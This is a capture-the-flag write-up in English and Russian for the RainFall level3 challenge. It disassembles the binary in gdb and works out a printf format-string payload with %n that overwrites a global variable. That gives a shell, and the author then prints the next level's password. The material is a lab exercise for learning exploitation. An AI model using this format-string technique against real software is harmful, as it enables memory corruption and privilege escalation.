Let's see what we have?

level3@RainFall:~$ ls -la

We have one binary file level3 from user level4
Let's see what it contains?

gdb ./level3
(gdb) disas main
    Dump of assembler code for function main:
       0x0804851a <+0>: push   %ebp
       0x0804851b <+1>: mov    %esp,%ebp
       0x0804851d <+3>: and    $0xfffffff0,%esp
       0x08048520 <+6>: call   0x80484a4 <v> 
       0x08048525 <+11>:    leave  
       0x08048526 <+12>:    ret    
    End of assembler dump.

Вызывается только одна функция <v>. Посмотрим, что она делает

(gdb) disas v
    Dump of assembler code for function v:
       0x080484a4 <+0>: push   %ebp
       0x080484a5 <+1>: mov    %esp,%ebp
       0x080484a7 <+3>: sub    $0x218,%esp
       0x080484ad <+9>: mov    0x8049860,%eax
       0x080484b2 <+14>:    mov    %eax,0x8(%esp)
       0x080484b6 <+18>:    movl   $0x200,0x4(%esp)
       0x080484be <+26>:    lea    -0x208(%ebp),%eax
       0x080484c4 <+32>:    mov    %eax,(%esp)
       0x080484c7 <+35>:    call   0x80483a0 <fgets@plt>
       0x080484cc <+40>:    lea    -0x208(%ebp),%eax
       0x080484d2 <+46>:    mov    %eax,(%esp)
       0x080484d5 <+49>:    call   0x8048390 <printf@plt>
       0x080484da <+54>:    mov    0x804988c,%eax  
       0x080484df <+59>:    cmp    $0x40,%eax  
       0x080484e2 <+62>:    jne    0x8048518 <v+116>
       0x080484e4 <+64>:    mov    0x8049880,%eax
       0x080484e9 <+69>:    mov    %eax,%edx
       0x080484eb <+71>:    mov    $0x8048600,%eax
       0x080484f0 <+76>:    mov    %edx,0xc(%esp)
       0x080484f4 <+80>:    movl   $0xc,0x8(%esp)
       0x080484fc <+88>:    movl   $0x1,0x4(%esp)
       0x08048504 <+96>:    mov    %eax,(%esp)
       0x08048507 <+99>:    call   0x80483b0 <fwrite@plt>
       0x0804850c <+104>:   movl   $0x804860d,(%esp)
       0x08048513 <+111>:   call   0x80483c0 <system@plt>
       0x08048518 <+116>:   leave  
       0x08048519 <+117>:   ret    
    End of assembler dump.

Что интересно:  на 49 строке есть <printf>
                на 54 строке кладем какую-то переменную, котоую потом сравниваем
                на 59 строке сравниваем что-то с числом 0х40 == 64
                И на 111 строке вызов нужной нам функции, 
                    поэтому мы должны пройти проверку, чтобы до нее добраться а не перепрыгнуть

Посмотрим какие у нас есть переменные

(gdb) info variables
    All defined variables:
    
    Non-debugging symbols:
    0x080485f8  _fp_hw
    0x080485fc  _IO_stdin_used
    0x08048734  __FRAME_END__
    0x08049738  __CTOR_LIST__
    0x08049738  __init_array_end
    0x08049738  __init_array_start
    0x0804973c  __CTOR_END__
    0x08049740  __DTOR_LIST__
    0x08049744  __DTOR_END__
    0x08049748  __JCR_END__
    0x08049748  __JCR_LIST__
    0x0804974c  _DYNAMIC
    0x08049818  _GLOBAL_OFFSET_TABLE_
    0x0804983c  __data_start
    0x0804983c  data_start
    0x08049840  __dso_handle
    0x08049860  stdin@@GLIBC_2.0
    0x08049880  stdout@@GLIBC_2.0
    0x08049884  completed.6159
    0x08049888  dtor_idx.6161
    0x0804988c  m

Видим только одну объявленную переменную m с адресом совпадающим с 54 строкой из <v>, она то нам и нужна
Ее мы должны каким-то образом подменить, чтобы проверка прошла

Это мы можем сделать подав в <printf> форматную строку. Проверим, что это может сработать:

(gdb) ! ./level3 
    0000 %p %p %p %p %p %p %p
    0000 0x200 0xb7fd1ac0 0xb7ff37d0 0x30303030 0x20702520 0x25207025 0x70252070
    ----                            ------------

Да, <printf> действительно принимает форматную строку и считывает переданную строку как 4-й по счету аргумент

Какие есть уязвимости у <printf> и как мы можем подменить m с помощью него?
Спецификатор формата %n заставляет printf() инициализировать переменную со значением, равным числу уже выведенных символов.
т.е. в нашем случае мы должны вывести 64 символа

Поэтому мы можем в качестве строки подать в него адрес переменной m (4 символа), 
60 произвольных символов произвольной длины (например зададим ширину для %d) 
и следом %n со ссылкой на 4-й аргумент (чтобы новая переменная попала по нужному адресу)

echo -e "\x8c\x98\x04\x08%60d%4\$n" > /tmp/level3

cat /tmp/level3 - | ./level3
�                                                         512
Wait what?!
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa

su level4
